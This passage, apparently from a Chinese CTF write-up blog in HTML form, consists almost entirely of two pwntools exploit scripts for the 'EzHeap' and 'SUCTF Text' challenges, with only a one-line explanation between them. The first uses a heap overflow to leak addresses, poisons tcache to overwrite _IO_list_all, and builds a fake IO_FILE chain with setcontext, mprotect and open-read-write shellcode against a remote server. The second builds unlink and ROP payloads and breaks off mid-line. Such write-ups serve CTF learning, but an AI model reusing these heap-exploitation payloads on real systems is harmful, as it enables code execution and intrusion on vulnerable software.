class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./EzHeap&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>				:p.recvall(timeout=time)</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;8.147.132.163&#x27;</span>,<span class="number">12640</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;size:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;idx:&#x27;</span>,tbs(idx))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;idx:&#x27;</span>,tbs(idx))</span><br><span class="line">	sla(<span class="string">b&#x27;size:&#x27;</span>,tbs(size))</span><br><span class="line">	sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;idx:&#x27;</span>,tbs(idx))</span><br><span class="line">	ru(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;0000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">heapbase=(u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))&lt;&lt;<span class="number">12</span>)-<span class="number">0x2000</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heapbase)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;2222&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1a0</span>,<span class="string">b&#x27;3333&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1a0</span>,<span class="string">b&#x27;4444&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1a0</span>,<span class="string">b&#x27;5555&#x27;</span>)</span><br><span class="line">add(<span class="number">0x1a0</span>,<span class="string">b&#x27;6666&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;777&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;888&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;9999&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;11&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;12&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;14&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x110</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x110</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x110</span>)</span><br><span class="line">libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x110</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x108</span>+p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">listall=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">stdout=libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">mprotect=libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">setcon=libc.address+<span class="number">0x53A1D</span></span><br><span class="line">wfile=libc.address+<span class="number">0x2170c0</span></span><br><span class="line">edit(<span class="number">12</span>,<span class="number">0x1b8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64((listall)^((heapbase&gt;&gt;<span class="number">12</span>)+<span class="number">3</span>)))</span><br><span class="line">edit(<span class="number">12</span>,<span class="number">0x1b8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x101</span>))</span><br><span class="line">gadget=libc.address+<span class="number">0x167420</span><span class="comment">#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">payload = flat(</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x8</span>:heapbase+<span class="number">0x2a50</span>,</span><br><span class="line">		<span class="number">0x20</span>:setcon,</span><br><span class="line">		<span class="number">0xa0</span>:heapbase+<span class="number">0x2af8</span>,<span class="comment">#rsp</span></span><br><span class="line">		<span class="number">0x68</span>:heapbase+<span class="number">0x2000</span>,<span class="comment">#rdi</span></span><br><span class="line">		<span class="number">0x70</span>:<span class="number">0x1000</span>,</span><br><span class="line">		<span class="number">0x88</span>:<span class="number">7</span>,</span><br><span class="line">		<span class="number">0xa8</span>:mprotect,</span><br><span class="line">	&#125;,</span><br><span class="line">	filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,heapbase,<span class="number">64</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,heapbase,<span class="number">64</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(heapbase+<span class="number">0x2b00</span>)+asm(shellcode)</span><br><span class="line"></span><br><span class="line">fake_io_addr=heapbase+<span class="number">0x2f50</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">fake_IO_FILE=p64(heapbase+<span class="number">0x2a40</span>)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(heapbase+<span class="number">0x2a40</span>)</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(gadget)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x2000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(wfile+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x1a0</span>,fake_IO_FILE)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x1a0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;4444&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>,p64(fake_io_addr))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2025SUCTF-Text"><a href="#2025SUCTF-Text" class="headerlink" title="2025SUCTF-Text"></a>2025SUCTF-Text</h1><p>可以在mmap出的地址向后32位地址空间任意读,泄露信息,打unlink</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii, struct</span><br><span class="line"><span class="keyword">import</span> glverm</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&#x27;./SU_text&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">elf = ELF(elf_path, checksec = <span class="literal">False</span>)</span><br><span class="line">context.binary = elf_path</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>            :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> flag, drop=<span class="literal">False</span>    :p.recvuntil(flag, drop)</span><br><span class="line">rl  = <span class="keyword">lambda</span>                     :p.recvline()</span><br><span class="line">ra  = <span class="keyword">lambda</span> time=<span class="number">0.5</span>            :p.recvall(timeout = time)</span><br><span class="line">u7f = <span class="keyword">lambda</span>                     :u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> flag, content       :p.sendlineafter(flag, content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> flag, content       :p.sendafter(flag, content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content             :p.sendline(content)</span><br><span class="line">s   = <span class="keyword">lambda</span> content             :p.send(content)</span><br><span class="line">irt = <span class="keyword">lambda</span>                     :p.interactive()</span><br><span class="line">tbs = <span class="keyword">lambda</span> content             :<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak= <span class="keyword">lambda</span> name, addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">fmt = <span class="keyword">lambda</span> string              :<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">cw  = <span class="keyword">lambda</span> cmd                 :<span class="string">f&quot;cwatch execute &#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;\n&quot;</span></span><br><span class="line">bp  = <span class="keyword">lambda</span> dst                 : (</span><br><span class="line">    <span class="string">f&quot;b <span class="subst">&#123;dst&#125;</span>\n&quot;</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(dst, <span class="built_in">str</span>) <span class="keyword">else</span></span><br><span class="line">    <span class="string">f&quot;b *$rebase(<span class="subst">&#123;dst&#125;</span>)\n&quot;</span> <span class="keyword">if</span> dst &lt; <span class="number">0x3fe000</span> <span class="keyword">else</span> <span class="string">f&quot;b *<span class="subst">&#123;dst&#125;</span>\n&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">load_sym = <span class="string">f&quot;loadsym <span class="subst">&#123;glverm.get_glibc(load_sym, <span class="string">&#x27;debug&#x27;</span>)&#125;</span>\n&quot;</span> <span class="keyword">if</span> (load_sym := <span class="string">&quot;&quot;</span>) <span class="keyword">else</span> <span class="string">&quot;&quot;</span> <span class="comment"># load_sym := glibc version</span></span><br><span class="line">GDB_SC = load_sym + cw(<span class="string">&#x27;tele $rebase(0x5060) 10&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">sc = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    LOCAL <span class="keyword">and</span> (gdb.attach(p, GDB_SC + sc <span class="keyword">if</span> sc <span class="keyword">else</span> GDB_SC), pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">return</span> process(elf_path) <span class="keyword">if</span> LOCAL <span class="keyword">else</span> remote(<span class="string">&#x27;1.95.76.73&#x27;</span>, <span class="number">10010</span>)</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">p = run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">	payload = p8(<span class="number">1</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(idx)</span><br><span class="line">	payload += p32(size)</span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">	payload = p8(<span class="number">1</span>)</span><br><span class="line">	payload += p8(<span class="number">17</span>)</span><br><span class="line">	payload += p8(idx)</span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_buf</span>(<span class="params">idx, offset</span>):</span><br><span class="line">	payload = p8(<span class="number">2</span>)</span><br><span class="line">	payload += p8(idx)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x15</span>)</span><br><span class="line">	payload += p32(offset)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p8(<span class="number">0</span>)</span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx, offset</span>):</span><br><span class="line">	payload = p8(<span class="number">2</span>)</span><br><span class="line">	payload += p8(idx)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x16</span>)</span><br><span class="line">	payload += p32(offset)</span><br><span class="line">	payload += p8(<span class="number">0</span>)</span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_unlink</span>(<span class="params">idx</span>):</span><br><span class="line">	payload = p8(<span class="number">2</span>)</span><br><span class="line">	payload += p8(idx)</span><br><span class="line">	result = <span class="built_in">bytearray</span>()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>), <span class="number">4</span>):</span><br><span class="line">		result.extend(<span class="string">b&#x27;\x11\x10&#x27;</span>)</span><br><span class="line">		result.extend(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">		result.extend(<span class="string">b&#x27;\0&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">	payload += result</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x3e0</span>)</span><br><span class="line">	payload += p64(<span class="number">0x410</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x3e8</span>)</span><br><span class="line">	payload += p64(<span class="number">0x420</span>)</span><br><span class="line">	payload += p8(<span class="number">0</span>)  </span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_unlink2</span>():</span><br><span class="line">	payload = p8(<span class="number">2</span>)</span><br><span class="line">	payload += p8(<span class="number">1</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x8</span>)</span><br><span class="line">	payload += p64(<span class="number">0x411</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x10</span>)</span><br><span class="line">	payload += p64(code + <span class="number">0x5078</span> - <span class="number">0x18</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x18</span>)</span><br><span class="line">	payload += p64(code + <span class="number">0x5078</span> - <span class="number">0x10</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x20</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x28</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x0</span>)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p8(<span class="number">0</span>)  </span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_rop1</span>():</span><br><span class="line">	payload = p8(<span class="number">2</span>)</span><br><span class="line">	payload += p8(<span class="number">1</span>)</span><br><span class="line">	payload += p8(<span class="number">16</span>)</span><br><span class="line">	payload += p8(<span class="number">0x14</span>)</span><br><span class="line">	payload += p32(<span class="number">0x18</span>)</span><br><span class="line">	payload += p64(stack-<span class="number">0x58</span>)</span><br><span class="line">	payload += p8(<span class="number">0</span>)  </span><br><span class="line">	payload += p8(<span class="number">3</span>)</span><br><span class="line">	sa(<span class="string">b&#x27;bytes):\n&#x27;</span>, payload)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_rop2</span>(<span class="params">content</span>):</span><br><span class="line">	payload = p8(<span class="number">2</span>)</span><br><span class="line">	payload += p8(<span 